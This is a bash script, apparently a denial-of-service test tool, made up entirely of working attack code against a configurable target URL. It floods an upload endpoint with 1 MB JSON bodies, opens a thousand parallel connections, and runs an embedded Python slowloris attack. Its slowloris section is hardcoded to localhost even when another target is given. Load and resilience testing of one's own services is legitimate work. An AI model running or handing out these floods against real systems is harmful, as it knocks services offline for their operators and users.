#!/bin/bash

TARGET_URL=${1:-"http://localhost:8080"}

echo "[+] Starting DoS Testing on $TARGET_URL"

# Memory exhaustion
echo "[*] Testing memory exhaustion..."
for i in {1..100}; do
    curl -s -X POST "$TARGET_URL/api/upload" \
        -H "Content-Type: application/json" \
        -d '{"data":"'$(python3 -c "print('A' * 1000000)")'"}' &
done

# Connection flooding
echo "[*] Testing connection flooding..."
for i in {1..1000}; do
    curl -s "$TARGET_URL" >/dev/null &
done

# Slowloris attack
echo "[*] Testing slow HTTP attack..."
python3 -c "
import socket
import time
import threading

def slowloris():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('localhost', 8080))
        s.send(b'GET / HTTP/1.1\r\n')
        s.send(b'Host: localhost\r\n')
        for i in range(100):
            s.send(b'X-a: b\r\n')
            time.sleep(1)
    except:
        pass

for i in range(50):
    threading.Thread(target=slowloris).start()
"

wait
echo "[+] DoS testing complete"
